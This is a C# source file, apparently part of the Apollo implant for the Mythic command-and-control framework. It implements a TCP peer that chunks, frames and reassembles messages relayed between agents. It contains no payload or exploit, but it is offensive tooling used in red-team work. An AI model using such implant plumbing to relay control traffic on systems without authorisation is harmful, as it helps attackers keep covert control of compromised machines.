using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Linq;
using System.Text;
using AI = ApolloInterop;
using AS = ApolloInterop.Structs.ApolloStructs;
using TTasks = System.Threading.Tasks;
using System.Net.Sockets;
using ApolloInterop.Classes.Api;
using ApolloInterop.Classes.Core;
using System.Xml.Linq;
using ApolloInterop.Utils;
using ApolloInterop.Structs.ApolloStructs;
using System.Net;

namespace Apollo.Peers.TCP
{
    public class TCPPeer : AI.Classes.P2P.Peer
    {
        private AsyncTcpClient _tcpClient = null;
        private Action<object> _sendAction;
        private TTasks.Task _sendTask;
        private bool _connected = false;
        private int chunkSize = AI.Constants.IPC.SEND_SIZE;
        private UInt32 _currentMessageSize = 0;
        private UInt32 _currentMessageChunkNum = 0;
        private UInt32 _currentMessageTotalChunks = 0;
        private bool _currentMessageReadAllMetadata = false;
        private string _currentMessageID = Guid.NewGuid().ToString();
        private Byte[] _partialData = [];
        //private IntPtr _socketHandle = IntPtr.Zero;
        private Socket _client;
        private delegate void CloseHandle(IntPtr handle);
        //private CloseHandle _pCloseHandle;
        
        public TCPPeer(IAgent agent, PeerInformation info) : base(agent, info)
        {
            C2ProfileName = "tcp";
            _tcpClient = new AsyncTcpClient(info.Hostname, info.C2Profile.Parameters.Port);
            _tcpClient.ConnectionEstablished += OnConnect;
            _tcpClient.MessageReceived += OnMessageReceived;
            _tcpClient.Disconnect += OnDisconnect;
            //_pCloseHandle = _agent.GetApi().GetLibraryFunction<CloseHandle>(Library.KERNEL32, "CloseHandle");
            _sendAction = (object p) =>
            {
                TcpClient c = (TcpClient)p;
                while (c.Connected && !_cts.IsCancellationRequested)
                {
                    _senderEvent.WaitOne();
                    if (!_cts.IsCancellationRequested && c.Connected && _senderQueue.TryDequeue(out byte[] result))
                    {
                        UInt32 totalChunksToSend = (UInt32)(result.Length / chunkSize) + 1;
                        DebugHelp.DebugWriteLine($"have {totalChunksToSend} chunks to send out");
                        byte[] totalChunkBytes = BitConverter.GetBytes(totalChunksToSend);
                        Array.Reverse(totalChunkBytes);
                        for(UInt32 currentChunk = 0; currentChunk < totalChunksToSend; currentChunk++)
                        {
                            byte[] chunkData;
                            if ( (currentChunk + 1) * chunkSize > result.Length)
                            {
                                chunkData = new byte[result.Length - (currentChunk * chunkSize)];
                            } else
                            {
                                chunkData = new byte[chunkSize];
                            }
                            Array.Copy(result, currentChunk * chunkSize, chunkData, 0, chunkData.Length);
                            byte[] sizeBytes = BitConverter.GetBytes((UInt32)chunkData.Length + 8);
                            Array.Reverse(sizeBytes);
                            byte[] currentChunkBytes = BitConverter.GetBytes(currentChunk);
                            Array.Reverse(currentChunkBytes);
                            DebugHelp.DebugWriteLine($"sending chunk {currentChunk}/{totalChunksToSend} with size {chunkData.Length + 8}");
                            c.GetStream().BeginWrite(sizeBytes, 0, sizeBytes.Length, OnAsyncMessageSent, p);
                            c.GetStream().BeginWrite(totalChunkBytes, 0, totalChunkBytes.Length, OnAsyncMessageSent, p);
                            c.GetStream().BeginWrite(currentChunkBytes, 0, currentChunkBytes.Length, OnAsyncMessageSent, p);
                            c.GetStream().BeginWrite(chunkData, 0, chunkData.Length, OnAsyncMessageSent, p);
                        }
                        DebugHelp.DebugWriteLine($"finished sending data from _senderQueue");
                    }
                }
            };
        }

        public void OnAsyncMessageSent(IAsyncResult result)
        {
            TcpClient client = (TcpClient)result.AsyncState;
            if (client.Connected && !_cts.IsCancellationRequested)
            {
                client.GetStream().EndWrite(result);
            }
        }

        public override bool Connected()
        {
            return _connected;
        }

        public override bool Finished()
        {
            return _previouslyConnected && !_connected;
        }

        public void OnConnect(object sender, TcpMessageEventArgs args)
        {
            args.State = this;
            OnConnectionEstablished(sender, args);
            _sendTask = new TTasks.Task(_sendAction, args.Client);
            _sendTask.Start();
            _connected = true;
            _previouslyConnected = true;
            _client = args.Client.Client;
        }

        public void OnDisconnect(object sender, TcpMessageEventArgs args)
        {
            _cts.Cancel();
            args.Client.Close();
            _senderEvent.Set();
            if(_sendTask != null){
                _sendTask.Wait();
            }
            _connected = false;
            base.OnDisconnect(this, args);
        }

        public void OnMessageReceived(object sender, TcpMessageEventArgs args)
        {
            Byte[] sData = args.Data.Data.Take(args.Data.DataLength).ToArray();
            while (sData.Length > 0)
            {
                if (_currentMessageSize == 0)
                {
                    // This means we're looking at the start of a new message
                    if (sData.Length < 4)
                    {
                        // we didn't even get enough for a size
                        
                    } else
                    {
                        Byte[] messageSizeBytes = sData.Take(4).ToArray();
                        sData = sData.Skip(4).ToArray();
                        Array.Reverse(messageSizeBytes);  // reverse the bytes so they're in big endian?
                        _currentMessageSize = BitConverter.ToUInt32(messageSizeBytes, 0) - 8;
                        continue;
                    }
                }
                if (_currentMessageTotalChunks == 0)
                {
                    // This means we're looking at the start of a new message
                    if (sData.Length < 4)
                    {
                        // we didn't even get enough for a size

                    }
                    else
                    {
                        Byte[] messageSizeBytes = sData.Take(4).ToArray();
                        sData = sData.Skip(4).ToArray();
                        Array.Reverse(messageSizeBytes);  // reverse the bytes so they're in big endian?
                        _currentMessageTotalChunks = BitConverter.ToUInt32(messageSizeBytes, 0);
                        continue;
                    }
                }
                if(_currentMessageChunkNum == 0 && !_currentMessageReadAllMetadata)
                {
                    // This means we're looking at the start of a new message
                    if (sData.Length < 4)
                    {
                        // we didn't even get enough for a size

                    }
                    else
                    {
                        Byte[] messageSizeBytes = sData.Take(4).ToArray();
                        sData = sData.Skip(4).ToArray();
                        Array.Reverse(messageSizeBytes);  // reverse the bytes so they're in big endian?
                        _currentMessageChunkNum = BitConverter.ToUInt32(messageSizeBytes, 0) + 1;
                        _currentMessageReadAllMetadata = true;
                        continue;
                    }

                }
                // try to read up to the remaining number of bytes
                if (_partialData.Length + sData.Length > _currentMessageSize)
                {
                    // we potentially have this message and the next data in the pipeline
                    byte[] nextData = sData.Take((int)_currentMessageSize - _partialData.Length).ToArray();
                    _partialData = [.. _partialData, .. nextData];
                    sData = sData.Skip(nextData.Length).ToArray();

                } else
                {
                    // we don't enough enough data to max out the current message size, so take it all
                    _partialData = [.. _partialData, .. sData];
                    sData = sData.Skip(sData.Length).ToArray();
                } 
                if (_partialData.Length == _currentMessageSize)
                {
                    DebugHelp.DebugWriteLine($"got chunk {_currentMessageChunkNum}/{_currentMessageTotalChunks} with size {_currentMessageSize + 8}");
                    UnwrapMessage();
                    _currentMessageSize = 0;
                    _currentMessageChunkNum = 0;
                    _currentMessageTotalChunks = 0;
                    _currentMessageReadAllMetadata = false;
                }
            }
        }

        private void UnwrapMessage()
        {
            AS.IPCChunkedData chunkedData = new (id: _currentMessageID, chunkNum: (int)_currentMessageChunkNum, totalChunks: (int)_currentMessageTotalChunks, data: _partialData.Take(_partialData.Length).ToArray());
            _partialData = [];
            lock (_messageOrganizer)
            {
                if (!_messageOrganizer.ContainsKey(chunkedData.ID))
                {
                    _messageOrganizer[chunkedData.ID] = new ChunkedMessageStore<AS.IPCChunkedData>();
                    _messageOrganizer[chunkedData.ID].MessageComplete += DeserializeToReceiver;
                }
            }
            _messageOrganizer[chunkedData.ID].AddMessage(chunkedData);
            if (_currentMessageChunkNum == _currentMessageTotalChunks)
            {
                _currentMessageID = Guid.NewGuid().ToString();
            }
        }

        public override bool Start()
        {
            return _tcpClient.Connect();
        }

        public override void Stop()
        {
            _cts.Cancel();  // should then hit the OnDisconnect which does all the cleanup
            _client?.Close();
        }
    }
}
